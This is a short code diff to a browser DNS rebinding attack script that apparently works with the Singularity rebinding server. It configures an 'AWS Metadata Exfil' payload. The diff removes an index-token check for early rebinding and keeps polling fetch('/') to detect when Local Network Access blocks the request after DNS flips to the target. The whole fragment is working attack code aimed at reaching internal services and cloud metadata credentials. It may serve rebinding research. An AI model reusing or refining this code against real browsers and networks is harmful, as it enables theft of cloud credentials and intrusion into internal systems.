@@ -105,7 +105,6 @@
         attackPayload:       'AWS Metadata Exfil',
 
         // Misc
-        indexToken:          '<!--thisismytesttoken-->',
         wsProxyPort:         3129,
         flushDns:            false,
         delayDOMLoad:        true,
@@ -204,6 +203,7 @@
             // While DNS points to attacker IP, fetch succeeds.
             // After DNS flips to target IP, LNA blocks fetch → TypeError.
             log('Polling fetch("/") every ' + CONFIG.interval + 's to detect LNA block...');
+            log('Waiting for browser DNS cache to expire (~60s)...');
 
             const pollMs = parseInt(CONFIG.interval) * 1000;
             let rebindDetected = false;
@@ -211,17 +211,7 @@
 
             while (!rebindDetected) {
                 try {
-                    const resp = await fetch('/', { cache: 'reload' });
-                    const text = await resp.text();
-
-                    // Double-check: if indexToken is present, we're still
-                    // hitting the attacker's Singularity server
-                    if (CONFIG.indexToken && !text.includes(CONFIG.indexToken)) {
-                        log('Response lacks indexToken — possible early rebind');
-                        rebindDetected = true;
-                        break;
-                    }
-
+                    await fetch('/', { cache: 'reload' });
                     polls++;
                     if (polls % 5 === 0) log('Still on attacker IP (' + polls + ' polls)...');
                 } catch (e) {
